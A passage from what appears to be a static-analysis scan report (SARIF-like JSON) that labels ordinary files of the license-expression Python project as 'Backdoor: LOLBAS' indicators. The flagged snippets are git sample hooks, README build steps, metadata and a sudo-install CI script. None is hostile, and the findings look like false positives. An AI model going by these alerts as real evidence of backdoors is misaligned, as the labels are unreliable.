                      "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                      "markdown": "`# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 37,
                  "endLine": 37,
                  "endColumn": 42,
                  "snippet": {
                    "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                    "rendered": {
                      "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                      "markdown": "`#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 25,
                  "endLine": 32,
                  "endColumn": 31,
                  "snippet": {
                    "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                    "rendered": {
                      "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                      "markdown": "`# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 40,
                  "endLine": 15,
                  "endColumn": 46,
                  "snippet": {
                    "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                    "rendered": {
                      "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                      "markdown": "`# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/docs/source/conf.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 18,
                  "endLine": 53,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n# This points to aboutcode.readthedocs.io\n# In case of \"undefined label\" ERRORS check docs on intersphinx to troubleshoot\n# Link was created at commit - https://github.com/nexB/aboutcode/commit/faea9fcf3248f8f198844fe34d43833224ac4a83\n\nintersphinx_mapping = {\n    \"aboutcode\": (\"https://aboutcode.readthedocs.io/en/latest/\", None),\n",
                    "rendered": {
                      "text": "\n# This points to aboutcode.readthedocs.io\n# In case of \"undefined label\" ERRORS check docs on intersphinx to troubleshoot\n# Link was created at commit - https://github.com/nexB/aboutcode/commit/faea9fcf3248f8f198844fe34d43833224ac4a83\n\nintersphinx_mapping = {\n    \"aboutcode\": (\"https://aboutcode.readthedocs.io/en/latest/\", None),\n",
                      "markdown": "`\n# This points to aboutcode.readthedocs.io\n# In case of \"undefined label\" ERRORS check docs on intersphinx to troubleshoot\n# Link was created at commit - https://github.com/nexB/aboutcode/commit/faea9fcf3248f8f198844fe34d43833224ac4a83\n\nintersphinx_mapping = {\n    \"aboutcode\": (\"https://aboutcode.readthedocs.io/en/latest/\", None),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/docs/source/conf.py"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 9,
                  "endLine": 122,
                  "snippet": {
                    "text": "\n   <br />\n\n.. role:: red\n\n.. role:: img-title\n\n.. role:: img-title-para\n",
                    "rendered": {
                      "text": "\n   <br />\n\n.. role:: red\n\n.. role:: img-title\n\n.. role:: img-title-para\n",
                      "markdown": "`\n   <br />\n\n.. role:: red\n\n.. role:: img-title\n\n.. role:: img-title-para\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/test_utils_pip_compatibility_tags.py.ABOUT"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 25,
                  "endLine": 14,
                  "endColumn": 30,
                  "snippet": {
                    "text": "download_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling\n",
                    "rendered": {
                      "text": "download_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling\n",
                      "markdown": "`download_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/test_utils_pip_compatibility_tags.py.ABOUT"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 38,
                  "endLine": 12,
                  "endColumn": 43,
                  "snippet": {
                    "text": "package_url: pkg:github/pypa/pip@20.3.1#tests/unit/test_utils_compatibility_tags.py\n\ndownload_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling\n",
                    "rendered": {
                      "text": "package_url: pkg:github/pypa/pip@20.3.1#tests/unit/test_utils_compatibility_tags.py\n\ndownload_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling\n",
                      "markdown": "`package_url: pkg:github/pypa/pip@20.3.1#tests/unit/test_utils_compatibility_tags.py\n\ndownload_url: https://raw.githubusercontent.com/pypa/pip/20.3.1/tests/unit/test_utils_compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/test_utils_pip_compatibility_tags.py.ABOUT"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 5,
                  "endLine": 6,
                  "snippet": {
                    "text": "\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: tests/unit/test_utils_compatibility_tags.py\n\npackage_url: pkg:github/pypa/pip@20.3.1#tests/unit/test_utils_compatibility_tags.py\n",
                    "rendered": {
                      "text": "\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: tests/unit/test_utils_compatibility_tags.py\n\npackage_url: pkg:github/pypa/pip@20.3.1#tests/unit/test_utils_compatibility_tags.py\n",
                      "markdown": "`\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: tests/unit/test_utils_compatibility_tags.py\n\npackage_url: pkg:github/pypa/pip@20.3.1#tests/unit/test_utils_compatibility_tags.py\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 28,
                  "endLine": 102,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n* Fetch https://github.com/pypa/get-virtualenv/raw/<latest tag>/public/virtualenv.pyz\n  for instance https://github.com/pypa/get-virtualenv/raw/20.2.2/public/virtualenv.pyz\n  and save to thirdparty and update the ABOUT and LICENSE files as needed.\n\n* This virtualenv app contains also bundled pip, wheel and setuptools that are\n  essential for the installation to work.\n",
                    "rendered": {
                      "text": "\n* Fetch https://github.com/pypa/get-virtualenv/raw/<latest tag>/public/virtualenv.pyz\n  for instance https://github.com/pypa/get-virtualenv/raw/20.2.2/public/virtualenv.pyz\n  and save to thirdparty and update the ABOUT and LICENSE files as needed.\n\n* This virtualenv app contains also bundled pip, wheel and setuptools that are\n  essential for the installation to work.\n",
                      "markdown": "`\n* Fetch https://github.com/pypa/get-virtualenv/raw/<latest tag>/public/virtualenv.pyz\n  for instance https://github.com/pypa/get-virtualenv/raw/20.2.2/public/virtualenv.pyz\n  and save to thirdparty and update the ABOUT and LICENSE files as needed.\n\n* This virtualenv app contains also bundled pip, wheel and setuptools that are\n  essential for the installation to work.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 31,
                  "endLine": 64,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    ./configure --dev\n    python etc/scripts/gen_requirements_dev.py --site-packages-dir <path to site-packages dir>\n\n* You can optionally install or update extra dev requirements after the\n  ./configure step such that these are included in the generated dev\n  requirements.\n\n",
                    "rendered": {
                      "text": "    ./configure --dev\n    python etc/scripts/gen_requirements_dev.py --site-packages-dir <path to site-packages dir>\n\n* You can optionally install or update extra dev requirements after the\n  ./configure step such that these are included in the generated dev\n  requirements.\n\n",
                      "markdown": "`    ./configure --dev\n    python etc/scripts/gen_requirements_dev.py --site-packages-dir <path to site-packages dir>\n\n* You can optionally install or update extra dev requirements after the\n  ./configure step such that these are included in the generated dev\n  requirements.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 31,
                  "endLine": 55,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    ./configure\n    python etc/scripts/gen_requirements.py --site-packages-dir <path to site-packages dir>\n\n* You can optionally install or update extra main requirements after the\n  ./configure step such that these are included in the generated main requirements.\n\n* Optionally, generate a development pip requirements file by running these::\n",
                    "rendered": {
                      "text": "    ./configure\n    python etc/scripts/gen_requirements.py --site-packages-dir <path to site-packages dir>\n\n* You can optionally install or update extra main requirements after the\n  ./configure step such that these are included in the generated main requirements.\n\n* Optionally, generate a development pip requirements file by running these::\n",
                      "markdown": "`    ./configure\n    python etc/scripts/gen_requirements.py --site-packages-dir <path to site-packages dir>\n\n* You can optionally install or update extra main requirements after the\n  ./configure step such that these are included in the generated main requirements.\n\n* Optionally, generate a development pip requirements file by running these::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 11,
                  "endLine": 30,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n\n\nGenerate or update pip requirement files\n----------------------------------------\n\nScripts\n",
                    "rendered": {
                      "text": "\n\n\nGenerate or update pip requirement files\n----------------------------------------\n\nScripts\n",
                      "markdown": "`\n\n\nGenerate or update pip requirement files\n----------------------------------------\n\nScripts\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 18,
                  "endLine": 16,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n* There are two run \"modes\":\n\n  * To generate or update pip requirement files, you need to start with a clean\n    virtualenv as instructed below (This is to avoid injecting requirements\n    specific to the tools used here in the main requirements).\n\n",
                    "rendered": {
                      "text": "\n* There are two run \"modes\":\n\n  * To generate or update pip requirement files, you need to start with a clean\n    virtualenv as instructed below (This is to avoid injecting requirements\n    specific to the tools used here in the main requirements).\n\n",
                      "markdown": "`\n* There are two run \"modes\":\n\n  * To generate or update pip requirement files, you need to start with a clean\n    virtualenv as instructed below (This is to avoid injecting requirements\n    specific to the tools used here in the main requirements).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 88,
                  "startColumn": 7,
                  "endLine": 88,
                  "endColumn": 12,
                  "snippet": {
                    "text": "* **fetch_thirdparty.py** will fetch package wheels, source sdist tarballs\n  and their ABOUT, LICENSE and NOTICE files to populate a local directory from\n  a list of PyPI simple URLs (typically PyPI.org proper and our self-hosted PyPI)\n  using pip requirements file(s), specifiers or pre-existing packages files.\n  Fetch wheels for specific python version and operating system combinations.\n\n* **check_thirdparty.py** will check a thirdparty directory for errors.\n",
                    "rendered": {
                      "text": "* **fetch_thirdparty.py** will fetch package wheels, source sdist tarballs\n  and their ABOUT, LICENSE and NOTICE files to populate a local directory from\n  a list of PyPI simple URLs (typically PyPI.org proper and our self-hosted PyPI)\n  using pip requirements file(s), specifiers or pre-existing packages files.\n  Fetch wheels for specific python version and operating system combinations.\n\n* **check_thirdparty.py** will check a thirdparty directory for errors.\n",
                      "markdown": "`* **fetch_thirdparty.py** will fetch package wheels, source sdist tarballs\n  and their ABOUT, LICENSE and NOTICE files to populate a local directory from\n  a list of PyPI simple URLs (typically PyPI.org proper and our self-hosted PyPI)\n  using pip requirements file(s), specifiers or pre-existing packages files.\n  Fetch wheels for specific python version and operating system combinations.\n\n* **check_thirdparty.py** will check a thirdparty directory for errors.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 36,
                  "endLine": 58,
                  "endColumn": 41,
                  "snippet": {
                    "text": "* You can optionally install or update extra main requirements after the\n  ./configure step such that these are included in the generated main requirements.\n\n* Optionally, generate a development pip requirements file by running these::\n\n    ./configure --clean\n    ./configure --dev\n",
                    "rendered": {
                      "text": "* You can optionally install or update extra main requirements after the\n  ./configure step such that these are included in the generated main requirements.\n\n* Optionally, generate a development pip requirements file by running these::\n\n    ./configure --clean\n    ./configure --dev\n",
                      "markdown": "`* You can optionally install or update extra main requirements after the\n  ./configure step such that these are included in the generated main requirements.\n\n* Optionally, generate a development pip requirements file by running these::\n\n    ./configure --clean\n    ./configure --dev\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 39,
                  "endLine": 49,
                  "endColumn": 44,
                  "snippet": {
                    "text": "The sequence of commands to run are:\n\n\n* Start with these to generate the main pip requirements file::\n\n    ./configure --clean\n    ./configure\n",
                    "rendered": {
                      "text": "The sequence of commands to run are:\n\n\n* Start with these to generate the main pip requirements file::\n\n    ./configure --clean\n    ./configure\n",
                      "markdown": "`The sequence of commands to run are:\n\n\n* Start with these to generate the main pip requirements file::\n\n    ./configure --clean\n    ./configure\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 18,
                  "endLine": 30,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n\n\nGenerate or update pip requirement files\n----------------------------------------\n\nScripts\n",
                    "rendered": {
                      "text": "\n\n\nGenerate or update pip requirement files\n----------------------------------------\n\nScripts\n",
                      "markdown": "`\n\n\nGenerate or update pip requirement files\n----------------------------------------\n\nScripts\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 7,
                  "endLine": 24,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    virtualenv or in the the main configured development virtualenv.\n    These requireements need to be installed::\n\n        pip install --requirement etc/scripts/requirements.txt\n\nTODO: we need to pin the versions of these tools\n\n",
                    "rendered": {
                      "text": "    virtualenv or in the the main configured development virtualenv.\n    These requireements need to be installed::\n\n        pip install --requirement etc/scripts/requirements.txt\n\nTODO: we need to pin the versions of these tools\n\n",
                      "markdown": "`    virtualenv or in the the main configured development virtualenv.\n    These requireements need to be installed::\n\n        pip install --requirement etc/scripts/requirements.txt\n\nTODO: we need to pin the versions of these tools\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/README.rst"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 25,
                  "endLine": 16,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n* There are two run \"modes\":\n\n  * To generate or update pip requirement files, you need to start with a clean\n    virtualenv as instructed below (This is to avoid injecting requirements\n    specific to the tools used here in the main requirements).\n\n",
                    "rendered": {
                      "text": "\n* There are two run \"modes\":\n\n  * To generate or update pip requirement files, you need to start with a clean\n    virtualenv as instructed below (This is to avoid injecting requirements\n    specific to the tools used here in the main requirements).\n\n",
                      "markdown": "`\n* There are two run \"modes\":\n\n  * To generate or update pip requirement files, you need to start with a clean\n    virtualenv as instructed below (This is to avoid injecting requirements\n    specific to the tools used here in the main requirements).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/install_sudo.sh"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 11,
                  "endLine": 6,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n",
                    "rendered": {
                      "text": "\n\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n",
                      "markdown": "`\n\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/install_sudo.sh"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 3,
                  "endLine": 13,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    yum install -y sudo\n\nelif [[ \"$1\" == \"dnf\" ]]; then\n    dnf install -y sudo\n\nfi\n",
                    "rendered": {
                      "text": "    yum install -y sudo\n\nelif [[ \"$1\" == \"dnf\" ]]; then\n    dnf install -y sudo\n\nfi\n",
                      "markdown": "`    yum install -y sudo\n\nelif [[ \"$1\" == \"dnf\" ]]; then\n    dnf install -y sudo\n\nfi\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/install_sudo.sh"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 3,
                  "endLine": 10,
                  "endColumn": 8,
                  "snippet": {
